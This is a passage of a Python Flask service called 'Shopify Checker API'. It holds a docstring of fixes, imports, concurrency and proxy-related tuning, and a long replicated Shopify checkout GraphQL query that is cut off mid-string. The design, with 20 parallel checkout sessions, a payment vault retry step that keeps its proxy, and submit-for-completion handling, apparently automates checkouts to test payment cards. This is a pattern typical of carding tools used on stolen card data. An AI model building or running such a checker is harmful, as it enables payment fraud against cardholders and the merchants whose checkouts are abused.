"""
Shopify Checker API — 20-Parallel Build (FIXED)
================================================
Fixes applied in this build:
  [1] ssl context now built via _make_ssl_ctx() — regenerable if corrupted
  [2] LRU-bounded connector cache (_MAX_CONN_CACHE=64) — no socket/FD leak
  [3] Proposal response walker handles `session: null` / Throttled wrappers
  [4] Vault retry ladder keeps proxy on retries; adds detailed error codes
  [5] Submit response walker handles `data.session.submitForCompletion` nesting
"""

import asyncio
import aiohttp
import json
import re
import random
import html as html_module
import logging
import ssl
import traceback
import threading
import time
import os
from urllib.parse import urlparse
from flask import Flask, request, jsonify

logging.basicConfig(level=logging.WARNING, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

# ── Tuning ────────────────────────────────────────────────────────────────────
MAX_PARALLEL   = 20
CONN_TIMEOUT   = 8
READ_TIMEOUT   = 15
POLL_INITIAL   = 0.3
POLL_RETRY     = 1.5
POLL_MAX       = 6
_MAX_CONN_CACHE = 64

QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on 